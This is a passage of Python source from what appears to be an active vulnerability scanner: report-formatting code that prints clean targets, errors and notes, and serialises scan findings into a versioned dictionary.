        lines.append("summary: 0 confirmed")
    clean = [t for t in report.tested if t not in set(report._vulnerable_targets())]
    if clean:
        shown = ", ".join(clean[:12])
        extra = f" (+{len(clean) - 12} more)" if len(clean) > 12 else ""
        lines.append(f"clean: {shown}{extra}")
    if report.errors:
        for error in report.errors[:5]:
            lines.append(f"error: {error}")
        if len(report.errors) > 5:
            lines.append(f"error: +{len(report.errors) - 5} more")
    if verbose:
        for note in report.notes:
            lines.append(f"note: {note}")
    return "\n".join(lines)


def _to_dict(report: ScanReport) -> dict[str, object]:
    return {
        "schema_version": "1.0.0",
        "report_type": "active-scan",
        "target": report.target,
        "mode": report.mode,
        "pages": report.pages,
        "requests": report.requests,
        "elapsed_seconds": round(report.elapsed, 3),
        "confirmed": report._confirmed(),
        "tested": report.tested,
        "vulnerable_targets": report._vulnerable_targets(),
        "findings": [
            {
                "category": f.category,
                "target": f.target,
                "parameter": f.parameter,
                "payload": f.payload,
                "confidence": f.confidence,
                "evidence": f.evidence,
            }
            for f in report.findings
        ],
        "notes": report.notes,
        "errors": report.errors,
    }
